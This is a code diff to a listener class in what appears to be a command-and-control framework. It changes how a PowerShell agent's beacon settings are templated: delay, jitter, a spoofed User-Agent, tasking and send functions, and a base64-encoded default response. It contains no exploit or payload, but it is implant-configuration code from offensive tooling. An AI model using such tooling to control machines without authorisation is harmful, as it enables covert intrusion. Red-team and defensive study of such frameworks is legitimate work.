@@ -589,21 +589,32 @@ class Listener:
         if language:
             if language.lower() == 'powershell':
                 listener_dict = """
-{{
-    'name': '{name}',
-    'delay' : {delay},
-    'jitter' : {jitter},
-    'fixed_parameters': {{
-        'headers' : {{'User-Agent': "{UA}"}},
-        'taskURIs' : "{taskURIs}",
-    }},
-    'send_func': {send_func},
-    'defaultResponse': "{defaultResponse}",
-    'lostLimit': {lostLimit},
-    'missedCheckins':0,
-}},
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"}}
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
 #LISTENER_DICT
-"""
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'])
 
                 getTask = """
     $script:GetTask{name} = {{
@@ -709,7 +720,7 @@ class Listener:
                             sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
                 else:
                     return (listener_dict,
-                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                            getTask.format(name = listenerOptions['Name']['Value']),
                             sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
